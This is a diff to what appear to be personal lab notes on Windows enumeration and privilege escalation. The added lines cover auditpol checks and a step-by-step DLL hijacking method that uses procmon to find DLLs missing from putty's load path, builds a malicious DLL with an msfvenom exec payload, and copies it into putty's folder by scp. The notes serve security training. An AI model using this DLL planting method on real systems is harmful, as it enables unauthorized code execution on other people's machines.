@@ -493,7 +493,18 @@ Check Services
 --> Go to task scheduler --> look at triggers --> look what actions are prompted by those triggers. (Can dig into directory that is set to run Upload/replace DLL's or EXE's)
 
 !! AUDIT LOGGING !!
-auditpol /get /category:*
+(need to be admin to run these commands)
+auditpol /get /category:* (important ones: policies containing "success, failure, or success & failure")
+auditpol /get /category:* | findstr /i "Success Failure"
 
-
-
+##############  DLL HIJACKING  ################
+- download putty.exe from resources (put putty in its own folder)
+- start procmon --> do procmon /accepteula in cmdline
+- run putty
+- process    contains    putty
+- path    contains    .dll
+- result    is    NAME NOT FOUND
+- identify .dll to alter
+- msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll (SSPICLI.dll is what we are naming it)
+- once created SCP to your target box
+- scp from windows and pull from linbox. scp student@<linops ip>:/home/student/SSPICLI.dll C:\Users\student\Documents\putty
